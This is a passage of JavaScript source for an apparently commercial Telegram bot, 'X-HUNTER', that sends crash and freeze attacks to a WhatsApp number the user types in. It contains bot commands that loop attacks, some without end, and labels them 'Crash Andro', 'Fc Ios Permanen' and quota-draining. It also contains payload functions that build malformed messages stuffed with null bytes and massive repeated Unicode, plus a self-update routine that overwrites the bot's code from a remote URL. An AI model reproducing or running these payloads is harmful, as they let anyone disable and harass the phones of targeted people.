<blockquote>𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢
@FadzxGanteng ➜ ᴏᴡɴᴇʀ sᴄʀɪᴘᴛ
@dapzzimutt ➜ ʙᴇsᴛ ғʀɪᴇɴᴅ + ʙᴇsᴛ sᴜᴘᴘᴏʀᴛ
@VanxxID ➜ ʙᴇsᴛ ғʀɪᴇɴᴅ + ʙᴇsᴛ sᴜᴘᴘᴏʀᴛ
@ripzzmbut ➜ ʙᴇsᴛ ғʀɪᴇɴᴅ + ʙᴇsᴛ sᴜᴘᴘᴏʀᴛ
@XerozOfficial ➜ sᴜᴘᴘᴏʀᴛ
@GrenTzy ➜ ʙᴇsᴛ sᴜᴘᴘᴏʀᴛ
@Binance_support7482 ➜ ᴍʏ ᴛᴇᴀᴄʜᴇʀ
@senzystur ➜ ᴍʏ ᴀʙᴀɴɢ + sᴜᴘᴘᴏʀᴛ
All Buyer X-hunter 
All PT,own,TK Fadzx</blockquote>
`;

    const keyboard = [
        [
            { text: "ʙᴀᴄᴋ", callback_data: "/start", style: "success" }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqto_forMenu, {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });
        await ctx.answerCbQuery();
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description.includes("メッセージは変更されませんでした")) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di tqto_for menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});
//------------------(AUTO - UPDATE SYSTEM)--------------------//
bot.command("update", async (ctx) => doUpdate(ctx));

// ✅ UPDATE URL DISINI AJA (GAK DIPISAH)
const UPDATE_URL =
  "https://raw.githubusercontent.com/agungdermawan22332-sys/Astra-Void-Update/main/Destoryed.js"; // GANTI RAW URL

// ✅ foto /start
const thumbnailUp = "https://files.catbox.moe/j8ci57.jpg"; // GANTI (boleh file_id juga)

// ✅ file yang mau ditimpa update (samain sama file yang dijalanin panel)
const UPDATE_FILE_PATH = "./main.js"; // GANTI kalau panel jalanin file lain

function downloadToFile(url, filePath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(filePath);

    https
      .get(url, (res) => {
        if (res.statusCode !== 200) {
          file.close(() => fs.unlink(filePath, () => {}));
          return reject(new Error(`HTTP_${res.statusCode}`));
        }

        res.pipe(file);

        file.on("finish", () => file.close(resolve));
      })
      .on("error", (err) => {
        file.close(() => fs.unlink(filePath, () => {}));
        reject(err);
      });
  });
}

async function doUpdate(ctx) {
  if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  await ctx.reply("⏳ <b>Auto Update Script...</b>\nMohon tunggu.", {
    parse_mode: "HTML",
  });

  try {
    await downloadToFile(UPDATE_URL, UPDATE_FILE_PATH);

    await ctx.reply("✅ <b>Update berhasil!</b>\n♻ <i>Restarting bot...</i>", {
      parse_mode: "HTML",
    });

    setTimeout(() => process.exit(0), 1500);
  } catch (e) {
    await ctx.reply(
      `❌ <b>Gagal update.</b>\nReason: <code>${String(e.message || e)}</code>`,
      { parse_mode: "HTML" }
    );
  }
}

//------------------(CASE NO SPAM)--------------------//
/// --------- CASE BUG 2 BERBUTONN -------- ///
const clickedUsers = {};

bot.command("bug", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Example : /bug 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.replyWithPhoto(
    { source: "./image/X-hunter.jpg" },
    {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X-HUNTER ⎭ ⊰―—═⬡
⌑ Target : ${q}
⌑ Status : Ready
⌑ Note : No Spam Bug
⌑ Silahkan Pilih bug di bawah...
╘═——————————————═⬡</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Delay X Freeze", callback_data: `delay_${target}` },
            { text: "𝖣𝖾𝗅𝖺𝗒 𝗆𝖾𝗇𝗍𝖺𝗅𝗂𝗍𝗒", callback_data: `fc_${target}` }
          ],
          [
            { text: "𝖡𝗅𝖺𝗇𝗄 𝖠𝗇𝖽𝗋𝗈𝗂𝖽", callback_data: `blank_${target}` },
            { text: "Freeze Android", callback_data: `bulldozer_${target}` }
          ]
        ]
      }
    }
  );

});


bot.on("callback_query", async (ctx) => {

  const userId = ctx.from.id;
  const data = ctx.callbackQuery.data;

  const [key, target] = data.split("_");

  if (clickedUsers[userId]) {
    return ctx.answerCbQuery("⚠️ Kamu sudah memilih tombol ini!", { show_alert: true });
  }

  clickedUsers[userId] = true;

  await ctx.answerCbQuery();
  await ctx.deleteMessage();


  const methods = {

    delay: {
      name: "Delay X Freeze",
      func: async (t) => {
        for (let i = 0; i < 35; i++) {
          await Freezeinvisible(sock, target);
          await sleep(1000);
        }
      }
    },

    blank: {
      name: "𝖡𝗅𝖺𝗇𝗄 𝖠𝗇𝖽𝗋𝗈𝗂𝖽",
      func: async (t) => {
        for (let i = 0; i < 70; i++) {
          await bkp(sock, target);
          await sleep(1000);
        }
      }
    },

    bulldozer: {
      name: "Freeze Android",
      func: async (t) => {
        for (let i = 0; i < 25; i++) {
          await smsl(sock, target);
          await sleep(1000);
        }
      }
    },

    fc: {
      name: "𝖣𝖾𝗅𝖺𝗒 𝗆𝖾𝗇𝗍𝖺𝗅𝗂𝗍𝗒",
      func: async (t) => {
        for (let i = 0; i < 80; i++) {
          await DelayOnly(sock, target);
          await sleep(1000);
        }
      }
    }

  };


  const method = methods[key];
  if (!method) return;

  if (!isPremiumUser(userId) && ctx.chat.type === "private") {
    return ctx.reply("❌ Khusus user premium atau grup premium.", { parse_mode: "HTML" });
  }


  const msg = await ctx.replyWithPhoto(
    { source: "./image/X-hunter.jpg" },
    {
      caption: `
<blockquote><pre>⬡═―—⊱ ⎧ X-HUNTER ⎭ ⊰―—═⬡
⌑ Target : ${target.split("@")[0]}
⌑ Method : ${method.name}
⌑ Note : No Spam Bug
⌑ Process : [░░░░░░░░░░] 0%
╘═——————————————═⬡</pre></blockquote>`,
      parse_mode: "HTML"
    }
  );


  const attack = method.func(target);


  for (let i = 1; i <= 10; i++) {

    const bar = "█".repeat(i) + "░".repeat(10 - i);

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      msg.message_id,
      null,
      `
<blockquote><pre>⬡═―—⊱ ⎧ X-HUNTER ⎭ ⊰―—═⬡
⌑ Target : ${target.split("@")[0]}
⌑ Method : ${method.name}
⌑ Note : No Spam Bug
⌑ Process : [${bar}] ${i * 10}%
╘═——————————————═⬡</pre></blockquote>`,
      { parse_mode: "HTML" }
    );

    await sleep(800);
  }


  await attack;


  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    msg.message_id,
    null,
    `
<blockquote><pre>⬡═―—⊱ ⎧ X-HUNTER ⎭ ⊰―—═⬡
⌑ Target : ${target.split("@")[0]}
⌑ Method : ${method.name}
⌑ Note : No Spam Bug
⌑ Process : [██████████] 100%
╘═——————————————═⬡</pre></blockquote>`,
    { parse_mode: "HTML" }
  );

  delete clickedUsers[userId];

});

bot.command("tutixsix", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /tutixsix 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Delay Hard 
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  while (true) {
    await DlY(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Delay Hard 
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("hunter", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /hunter 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Fc Ios Permanen 
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  while (true) {
    await iosCtt(sock, target);
    await invisPermaIOS(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Fc Ios Permanen
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("hunterx", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /hunterx 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Crash Andro 
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  while (true) {
    await MantanNyLebihBgus(sock, target);
    await sleep(1500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Crash Andro
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xhunter", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xhunter 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: blank andro
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  while (true) {
    await xnotif(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: blank andro
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("hunterfadzx", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /hunterfadzx 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Forclose No click 
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  while (true) {
    await XVTXVTXVT(sock, target);
    await fcxka(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Forclose No click 
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("hunterxfadzx", premGroupOnly(), checkCooldown, checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /hunterxfadzx 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Crash Ios 
⌑ Status: Process
╘═——————————————═⬡\`\`\``,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  while (true) {
    await iosCtt(sock, target);
    await invisPermaIOS(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `\`\`\`JS
⬡═―⊱「 X-HUNTER 」⊰―═⬡
⌑ Target: ${q}
⌑ Type: Crash Ios
⌑ Status: Success
╘═——————————————═⬡\`\`\``, {
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});
//------------------(CASE BEBAS SPAM)--------------------//
bot.command("xfadzx", premGroupOnly(), checkCooldown, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /xfadzx 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote>⎧ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 ⎭</blockquote>
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ : delay invisible hard 
ꜱᴛᴀᴛᴜꜱ : Succses`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 10; i++) {
      await diley(target);
      await sleep(1500);
    }
  })();
});

bot.command("xdelay", premGroupOnly(), checkCooldown, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /xdelay 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote>⎧ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 ⎭</blockquote>
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ : delay invisible 
ꜱᴛᴀᴛᴜꜱ : Succses`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 10; i++) {
      await diley(sock, target);
      await sleep(1500);
    }
  })();
});

bot.command("xmbut", premGroupOnly(), checkCooldown, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /xmbut 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote>⎧ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 ⎭</blockquote>
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ : Freeze invisible
ꜱᴛᴀᴛᴜꜱ : Succses`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 10; i++) {
      await MantanNyLebihBgus(sock, target);
      await sleep(1500);
    }
  })();
});

bot.command("xioszx", premGroupOnly(), checkCooldown, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /xioszx 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote>⎧ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 ⎭</blockquote>
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ : forclose ios 
ꜱᴛᴀᴛᴜꜱ : Succses`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 10; i++) {
      await Widixxxbulldozer(target);
      await WidxBuldoZerDelay(sock, target);
      await DelayBebaspamWidix(sock, target);
      await WidixDelayInvis(sock, target);
      await Memek(sock, target);
      await sleep(100);
    }
  })();
});

bot.command("xbulzx", premGroupOnly(), checkCooldown, checkWhatsAppConnection, checkCooldown, async (ctx) => {

  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 ☇ Example : /xbulzx 62xx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.reply(
    `<blockquote>⎧ 𝗦𝗨𝗖𝗖𝗘𝗦 𝗞𝗜𝗥𝗜𝗠 𝗕𝗨𝗚 ⎭</blockquote>
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ : buldozer ( sedot kuota )
ꜱᴛᴀᴛᴜꜱ : Succses`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "⌜📱⌟ 𝑪𝒆𝒌 ☇ 𝑻𝒂𝒓𝒈𝒆𝒕", url: `https://wa.me/${q}` }
        ]]
      }
    }
  );

  (async () => {
    for (let i = 0; i < 10; i++) {
      await Widixxxbulldozer(target);
      await WidxBuldoZerDelay(sock, target);
      await DelayBebaspamWidix(sock, target);
      await WidixDelayInvis(sock, target);
      await Memek(sock, target);
      await sleep(100);
    }
  })();
});
//------------------(AWAL OF FUNCTION)--------------------//
async function DlY(sock, target) {
  const msg = {
     statusUpdateMessage: {
        status: {
          text: {
            text: "\0".repeat(randomSize) + "FXV"
          },
          mentionedJids: [target],
          sender: {
            jid: target,
            name: "FadzxEverbody"
          }
        }
      },
      interactiveMessage: {
        body: {
          text: "\0".repeat(randomSize)
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "\0".repeat(5000),
                id: "\0".repeat(5000)
              })
            }
          ]
        }
      }
    };
await sock,relayMessage(target, msg, {})
}

async function iosCtt(sock, target) {
  await sock.relayMessage(target, {
    contactMessage: {
      displayName:
        "🎭⃟༑⌁⃰𝐙𝐞‌𝐫𝐨 𝑪‌𝒓𝒂‌‌𝒔𝒉ཀ‌‌🐉" +
        "𑇂𑆵𑆴𑆿".repeat(10000),
      vcard: `BEGIN:VCARD
VERSION:3.0
N:;𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)};;;
FN:𑇂𑆵𑆴𑆿${"𑇂𑆵𑆴𑆿".repeat(10000)}
NICKNAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
ORG:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
TITLE:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item1.TEL;waid=6287873499996:+62 878-7349-9996
item1.X-ABLabel:Telepon
item2.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item2.X-ABLabel:Kantor
item3.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item3.X-ABLabel:Kantor
item4.EMAIL;type=INTERNET:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
item4.X-ABLabel:Pribadi
item5.ADR:;;𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)};;;;
item5.X-ABADR:ac
item5.X-ABLabel:Rumah
X-YAHOO;type=KANTOR:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
PHOTO;${null}
X-WA-BIZ-NAME:𑇂𑆵𑆴𑆿${"ᩫᩫ".repeat(4000)}
END:VCARD`,
      contextInfo: {
        externalAdReply: {
          automatedGreetingMessageShown: true,
          automatedGreetingMessageCtaType: "\u0000".repeat(100000),
          greetingMessageBody: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨⁉️",
        },
      },
    },
  }, {
    participant: { jid: target },
  });
}

async function xnotif(sock, target) {
  const m = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Fadzx",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: "  — 𝐅𝐚𝐝𝐳𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐗 𝐃𝐚𝐫𝐞𝐝𝐞𝐯𝐢𝐥  " + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  copy_code: "𑜦𑜠".repeat(10000)
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "PAYMENT_PROMOTION",
                  flow_message_version: "3"
                })
              }
            ],
          },
        },
      },
    },
  };

  await sock.relayMessage(target, m, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
  await sock.relayMessage(
    "status@broadcast",
    m,
    {
      messageId: sock.generateMessageTag(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target } }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function fcxka(sock,target){await sock.relayMessage(target,{interactiveMessage:{header:{title:"0",subtitle:"0",hasMediaAttachment:true,locationMessage:{degreesLatitude:-6.2,degreesLongitude:16.816666,name:"⏤ í𝐬 𝐅𝐚𝐝𝐳𝐱",address:"Hello i'am Fadzx",jpegThumbnail:Buffer.alloc(10,"a").toString("base64")}},body:{text:"⏤ í𝐬 𝐩𝐚𝐧𝐠𝐞𝐫â𝐧 𝐅𝐚𝐝𝐳𝐱"},footer:{text:"I'am here brother"},contextInfo:{mentionedJid:target,isForwarded:true,externalAdReply:{title:"⏤ í𝐬 𝐅𝐚𝐝𝐳𝐱",body:"I'm thannzx",thumbnailUrl:"https://i.imgur.com/xxx.jpg",sourceUrl:"https://thannzx",mediaType:1,renderLargerThumbnail:true},forwardedNewsletterMessageInfo:{newsletterName:"I'm Fadzx",newsletterJid:"123@newsletter",serverMessageId:143},businessMessageForwardInfo:{businessOwnerJid:"13135550002@s.whatsapp.net"}},nativeFlowMessage:{buttons:[{name:"catalog_message",buttonParamsJson:JSON.stringify({})},{name:"booking_status",buttonParamsJson:JSON.stringify({})},{name:"review_and_pay",buttonParamsJson:JSON.stringify({currency:"IDR",total_amount:{value:0,offset:10},reference_id:"x",type:"physical-goods",order:{status:"payment_requested",subtotal:{value:0,offset:10},order_type:"ORDER",items:[{name:"x",amount:{value:0,offset:10},quantity:9999}]}})}],messageParamsJson:JSON.stringify({})}}},{additionalNodes:[{tag:"biz",attrs:{native_flow_name:"catalog_message"}}]});}

async function XVTXVTXVT(sock,target){await sock.relayMessage(target,{interactiveMessage:{header:{title:"0",subtitle:"0",hasMediaAttachment:true,locationMessage:{degreesLatitude:-6.2,degreesLongitude:16.816666,name:"⏤ 𝐅𝐀𝐃𝐙𝐗 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐓𝟓",address:"Hello i'am Fadzx",jpegThumbnail:Buffer.alloc(10,"a").toString("base64")}},body:{text:"⏤ 𝐅𝐀𝐃𝐙𝐗 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐓𝟓"},footer:{text:"I'am here brother"},contextInfo:{mentionedJid:target,isForwarded:true,externalAdReply:{title:"⏤ 𝐅𝐀𝐃𝐙𝐗 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐓𝟓",body:"I'm Fadzx",thumbnailUrl:"https://i.imgur.com/xxx.jpg",sourceUrl:"https://Fadzx",mediaType:1,renderLargerThumbnail:true},forwardedNewsletterMessageInfo:{newsletterName:"I'm Fadzx",newsletterJid:"123@newsletter",serverMessageId:143},businessMessageForwardInfo:{businessOwnerJid:"13135550002@s.whatsapp.net"}},nativeFlowMessage:{buttons:[{name:"catalog_message",buttonParamsJson:JSON.stringify({})},{name:"booking_status",buttonParamsJson:JSON.stringify({})},{name:"review_and_pay",buttonParamsJson:JSON.stringify({currency:"IDR",total_amount:{value:0,offset:10},reference_id:"x",type:"physical-goods",order:{status:"payment_requested",subtotal:{value:0,offset:10},order_type:"ORDER",items:[{name:"x",amount:{value:0,offset:10},quantity:9999}]}})}],messageParamsJson:JSON.stringify({})}}},{additionalNodes:[{tag:"biz",attrs:{native_flow_name:"catalog_message"}}]});}

async function invisPermaIOS(sock, target) {
  await sock.relayMessage("status@broadcast", {
  "contactMessage": {
    "displayName": "  — Fadzx Lagii Sedihh  " + "𑇂𑆵𑆴𑆿".repeat(10000),
